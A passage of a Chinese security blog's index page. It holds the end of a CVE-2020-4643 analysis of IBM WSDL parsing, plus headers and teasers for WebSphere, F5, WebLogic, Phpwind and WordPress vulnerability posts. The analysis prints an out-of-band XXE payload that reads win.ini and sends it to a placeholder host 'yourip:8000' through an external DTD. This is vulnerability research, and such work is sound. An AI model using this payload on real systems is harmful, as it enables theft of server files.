class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Definition <span class="title">parseDefinitions</span><span class="params">(String documentBaseURI, Element defEl, Map importedDefs)</span> <span class="keyword">throws</span> WSDLException </span>&#123;</span><br><span class="line">    checkElementName(defEl, Constants.Q_ELEM_DEFINITIONS);</span><br><span class="line">    WSDLFactory factory = <span class="keyword">this</span>.getWSDLFactory();</span><br><span class="line">    Definition def = factory.newDefinition();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.extReg != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setExtensionRegistry(<span class="keyword">this</span>.extReg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String name = DOMUtils.getAttribute(defEl, <span class="string">"name"</span>);</span><br><span class="line">    String targetNamespace = DOMUtils.getAttribute(defEl, <span class="string">"targetNamespace"</span>);</span><br><span class="line">    NamedNodeMap attrs = defEl.getAttributes();</span><br><span class="line">    <span class="keyword">if</span> (importedDefs == <span class="keyword">null</span>) &#123;</span><br><span class="line">        importedDefs = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (documentBaseURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setDocumentBaseURI(documentBaseURI);</span><br><span class="line">        ((Map)importedDefs).put(documentBaseURI, def);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setQName(<span class="keyword">new</span> QName(targetNamespace, name));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (targetNamespace != <span class="keyword">null</span>) &#123;</span><br><span class="line">        def.setTargetNamespace(targetNamespace);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> size = attrs.getLength();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        Attr attr = (Attr)attrs.item(i);</span><br><span class="line">        String namespaceURI = attr.getNamespaceURI();</span><br><span class="line">        String localPart = attr.getLocalName();</span><br><span class="line">        String value = attr.getValue();</span><br><span class="line">        <span class="keyword">if</span> (namespaceURI != <span class="keyword">null</span> &amp;&amp; namespaceURI.equals(<span class="string">"http://www.w3.org/2000/xmlns/"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (localPart != <span class="keyword">null</span> &amp;&amp; !localPart.equals(<span class="string">"xmlns"</span>)) &#123;</span><br><span class="line">                def.addNamespace(localPart, value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                def.addNamespace((String)<span class="keyword">null</span>, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Element tempEl = DOMUtils.getFirstChildElement(defEl); tempEl != <span class="keyword">null</span>; tempEl = DOMUtils.getNextSiblingElement(tempEl)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_IMPORT, tempEl)) &#123;</span><br><span class="line">            def.addImport(<span class="keyword">this</span>.parseImport(tempEl, def, (Map)importedDefs));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_DOCUMENTATION, tempEl)) &#123;</span><br><span class="line">            def.setDocumentationElement(tempEl);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_TYPES, tempEl)) &#123;</span><br><span class="line">            def.setTypes(<span class="keyword">this</span>.parseTypes(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_MESSAGE, tempEl)) &#123;</span><br><span class="line">            def.addMessage(<span class="keyword">this</span>.parseMessage(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_PORT_TYPE, tempEl)) &#123;</span><br><span class="line">            def.addPortType(<span class="keyword">this</span>.parsePortType(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_BINDING, tempEl)) &#123;</span><br><span class="line">            def.addBinding(<span class="keyword">this</span>.parseBinding(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (QNameUtils.matches(Constants.Q_ELEM_SERVICE, tempEl)) &#123;</span><br><span class="line">            def.addService(<span class="keyword">this</span>.parseService(tempEl, def));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            def.addExtensibilityElement(<span class="keyword">this</span>.parseExtensibilityElement(Definition.class, tempEl, def));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.parseExtensibilityAttributes(defEl, Definition.class, def, def);</span><br><span class="line">    <span class="keyword">return</span> def;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>com.ibm.wsdl.xml.WSDLReaderImpl#parseImport</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Import <span class="title">parseImport</span><span class="params">(Element importEl, Definition def, Map importedDefs)</span> <span class="keyword">throws</span> WSDLException </span>&#123;</span><br><span class="line">        Import importDef = def.createImport();</span><br><span class="line"></span><br><span class="line">        String locationURI;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String namespaceURI = DOMUtils.getAttribute(importEl, <span class="string">"namespace"</span>);</span><br><span class="line">            locationURI = DOMUtils.getAttribute(importEl, <span class="string">"location"</span>);<span class="comment">//获取location属性</span></span><br><span class="line">            String contextURI = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (namespaceURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">                importDef.setNamespaceURI(namespaceURI);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (locationURI != <span class="keyword">null</span>) &#123;</span><br><span class="line">                importDef.setLocationURI(locationURI);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.importDocuments) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        contextURI = def.getDocumentBaseURI();</span><br><span class="line">                        Definition importedDef = <span class="keyword">null</span>;</span><br><span class="line">                        InputStream inputStream = <span class="keyword">null</span>;</span><br><span class="line">                        InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line">                        URL url = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.loc != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            inputSource = <span class="keyword">this</span>.loc.getImportInputSource(contextURI, locationURI);</span><br><span class="line">                            String liu = <span class="keyword">this</span>.loc.getLatestImportURI();</span><br><span class="line">                            importedDef = (Definition)importedDefs.get(liu);</span><br><span class="line">                            <span class="keyword">if</span> (inputSource.getSystemId() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                inputSource.setSystemId(liu);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            URL contextURL = contextURI != <span class="keyword">null</span> ? StringUtils.getURL((URL)<span class="keyword">null</span>, contextURI) : <span class="keyword">null</span>;</span><br><span class="line">                            url = StringUtils.getURL(contextURL, locationURI);</span><br><span class="line">                            importedDef = (Definition)importedDefs.get(url.toString());</span><br><span class="line">                            <span class="keyword">if</span> (importedDef == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                inputStream = StringUtils.getContentAsInputStream(url);<span class="comment">//进行了请求，可以通过这个请求将数据外带，但是还是有些限制，例如有&amp;或"等字符的文件会报错导致带不了</span></span><br><span class="line">                                ...</span><br><span class="line">                                ...</span><br></pre></td></tr></table></figure>
+<p>xml payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xml如下：</span><br><span class="line">&lt;!DOCTYPE x [</span><br><span class="line">  &lt;!ENTITY % aaa SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % bbb SYSTEM &quot;http://yourip:8000/xx.dtd&quot;&gt;</span><br><span class="line">  %bbb;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;definitions name=&quot;HelloService&quot; xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;</span><br><span class="line">  &amp;ddd;</span><br><span class="line">&lt;/definitions&gt;</span><br><span class="line"></span><br><span class="line">xx.dtd如下：</span><br><span class="line">&lt;!ENTITY % ccc &apos;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=&quot;uri&quot; location=&quot;http://yourip:8000/xxeLog?%aaa;&quot;/&gt;&amp;#39;&gt;&apos;&gt;%ccc;</span><br></pre></td></tr></table></figure>
+<p><img src="images/CVE-2020-4643/2.png" alt=""></p>
+<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>我们只看了浮在表面上的一些地方，人工最多只看了两层调用，也许RCE隐藏在更深的地方或者知识盲点现在没找到呢，还是得有个属于自己的能查找链的工具，工具不会累，人会。</p>
+
+          
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析.html" itemprop="url">Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-28T14:17:32+08:00">
+                2020-07-28
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-08-03T18:31:23+08:00">
+                2020-08-03
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析.html" class="leancloud_visitors" data-flag-title="Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote>
+
+<blockquote>
+<p>已经有人先发了分析，就不再发了<br><img src="images/CVE-2020-4450/1.png" alt=""><br><img src="images/CVE-2020-4450/2.png" alt=""></p>
+</blockquote>
+
+          
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902).html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902).html" itemprop="url">F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-10T16:44:37+08:00">
+                2020-07-10
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-07-28T14:20:10+08:00">
+                2020-07-28
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902).html" class="leancloud_visitors" data-flag-title="F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote>
+
+<blockquote>
+<p>已发布到paper.seebug，<a href="https://paper.seebug.org/1271/" target="_blank" rel="noopener">https://paper.seebug.org/1271/</a><br><img src="images/f5-big-ip/1.png" alt=""></p>
+</blockquote>
+
+          
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/Java反序列化工具gadgetinspector原理初窥.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/Java反序列化工具gadgetinspector原理初窥.html" itemprop="url">Java反序列化工具gadgetinspector原理初窥</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-21T08:39:38+08:00">
+                2019-09-21
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-11-28T15:50:27+08:00">
+                2019-11-28
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/Java反序列化工具gadgetinspector原理初窥.html" class="leancloud_visitors" data-flag-title="Java反序列化工具gadgetinspector原理初窥">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote>
+
+<blockquote>
+<p>记录下自己初步研究gadgetinspector这个工具的一些东西吧</p>
+</blockquote>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/Java反序列化工具gadgetinspector原理初窥.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析.html" itemprop="url">WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-13T14:37:56+08:00">
+                2019-05-13
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-07-30T10:28:37+08:00">
+                2020-07-30
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析.html" class="leancloud_visitors" data-flag-title="WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote>
+
+<blockquote>
+<p>@xxlegend在他的<a href="http://xxlegend.com/2019/04/19/weblogic%20CVE-2019-2647%E7%AD%89%E7%9B%B8%E5%85%B3XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">博客</a>分析了其中的一个XXE漏洞点，并给出了PoC，作为入门级的Java新手，在大佬分析的基础上再分析很适合学习Java漏洞</p>
+</blockquote>
+<p>Oracle发布了4月份的补丁，详情见链接(<a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW</a></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/Phpwind9-GET型CSRF任意代码执行漏洞复现与分析.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/Phpwind9-GET型CSRF任意代码执行漏洞复现与分析.html" itemprop="url">Phpwind9-GET型CSRF任意代码执行漏洞复现与分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-08T09:08:04+08:00">
+                2019-03-08
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-03-08T14:19:30+08:00">
+                2019-03-08
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/Phpwind9-GET型CSRF任意代码执行漏洞复现与分析.html" class="leancloud_visitors" data-flag-title="Phpwind9-GET型CSRF任意代码执行漏洞复现与分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <blockquote class="blockquote-center">总有一段路,需要一个人走,那就一个人,勇敢的走完</blockquote>
+
+<blockquote>
+<p>学习wooyun1000个代码审计案例,看到很有技巧性的漏洞跟踪学习下</p>
+</blockquote>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/Phpwind9-GET型CSRF任意代码执行漏洞复现与分析.html#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+      <div>
+      
+      </div>
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://longofo.cc/wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行).html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Longofo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Longofo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行).html" itemprop="url">wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
